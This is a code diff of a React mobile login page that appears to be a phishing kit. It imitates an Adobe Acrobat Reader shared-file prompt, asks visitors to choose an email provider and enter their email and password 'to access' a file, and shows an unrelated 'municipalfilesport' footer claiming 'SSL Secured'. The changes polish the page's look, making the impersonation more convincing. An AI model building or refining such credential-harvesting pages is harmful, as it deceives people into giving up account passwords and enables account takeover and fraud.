@@ -50,8 +50,8 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
 
   const AdobeLogo = () => (
     <img 
-      src="https://upload.wikimedia.org/wikipedia/commons/a/ad/Adobe_Corporate_logo.svg" 
-      alt="Adobe Logo" 
+      src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/60/Adobe_Acrobat_Reader_icon_%282020%29.svg/640px-Adobe_Acrobat_Reader_icon_%282020%29.svg.png" 
+      alt="Adobe Acrobat Reader Logo" 
       className="w-9 h-9"
     />
   );
@@ -63,19 +63,19 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
         backgroundImage: "url('https://images.unsplash.com/photo-1588345921523-c2dcdb7f1dcd?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80')"
       }}
     >
-      <div className="bg-white/50 backdrop-blur-sm p-6 text-center">
+      <div className="bg-white/30 backdrop-blur-sm p-6 text-center">
         <div className="flex justify-center mb-4">
           <AdobeLogo />
         </div>
-        <h1 className="text-xl font-bold text-gray-800">
+        <h1 className="text-xl font-bold text-gray-900">
           {!selectedProvider ? 'Sign in to continue' : `Sign in with ${selectedProvider}`}
         </h1>
-        <p className="text-gray-600 mt-2 text-sm">
-          to access <span className="font-medium text-gray-700">{fileName}</span>
+        <p className="text-gray-700 mt-2 text-sm">
+          to access <span className="font-medium text-gray-800">{fileName}</span>
         </p>
       </div>
 
-      <div className="bg-white rounded-t-3xl shadow-2xl p-6 flex-grow-0">
+      <div className="bg-slate-100 rounded-t-3xl shadow-2xl p-6 flex-grow-0 border-t border-slate-200">
         {!selectedProvider ? (
           // --- Provider Selection UI ---
           <div>
@@ -86,7 +86,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
                   key={provider.name}
                   onClick={() => setSelectedProvider(provider.name)}
                   type="button"
-                  className="flex items-center p-4 bg-gray-50 rounded-xl border border-gray-200 active:bg-gray-100 active:border-blue-500 transition-all duration-200"
+                  className="flex items-center p-4 bg-white rounded-xl border border-gray-200 active:bg-blue-50 active:border-blue-500 transition-all duration-200"
                 >
                   <img src={provider.logo} alt={provider.name} className="w-8 h-8 object-contain" />
                   <span className="ml-3 text-base font-semibold text-gray-700">{provider.name}</span>
@@ -104,7 +104,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
 
             <form onSubmit={handleSubmit} className="space-y-5">
               {errorMessage && (
-                <div className="bg-red-50 text-red-700 p-3 rounded-lg text-sm font-medium text-center">
+                <div className="bg-red-100 text-red-700 p-3 rounded-lg text-sm font-medium text-center border border-red-200">
                   {errorMessage}
                 </div>
               )}
@@ -120,7 +120,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
                     onChange={(e) => setEmail(e.target.value)}
                     placeholder="you@example.com"
                     required
-                    className="w-full pl-11 pr-4 py-4 bg-gray-100 border-2 border-transparent rounded-lg focus:ring-2 focus:ring-blue-500 focus:bg-white focus:border-blue-500 transition"
+                    className="w-full pl-11 pr-4 py-4 bg-white border-2 border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition"
                   />
                 </div>
               </div>
@@ -133,4 +133,34 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
                     id="password"
                     type={showPassword ? 'text' : 'password'}
                     value={password}
-                    onChange={(e) => setPassword(e.targe
+                    onChange={(e) => setPassword(e.target.value)}
+                    placeholder="Enter your password"
+                    required
+                    className="w-full pl-11 pr-12 py-4 bg-white border-2 border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition"
+                  />
+                  <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700">
+                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
+                  </button>
+                </div>
+              </div>
+
+              <button
+                type="submit"
+                disabled={isLoading || !email || !password}
+                className="w-full flex items-center justify-center py-4 px-4 rounded-xl font-bold text-white bg-blue-600 hover:bg-blue-700 disabled:opacity-50 transition-colors shadow-lg shadow-blue-500/20"
+              >
+                {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
+                {isLoading ? 'Verifying...' : 'Sign In'}
+              </button>
+            </form>
+          </div>
+        )}
+      </div>
+      <div className="bg-slate-100 pt-2 pb-4">
+         <p className="text-xs text-gray-500 text-center">© 2025 municipalfilesport. SSL Secured.</p>
+      </div>
+    </div>
+  );
+};
+
+export default MobileLoginPage;
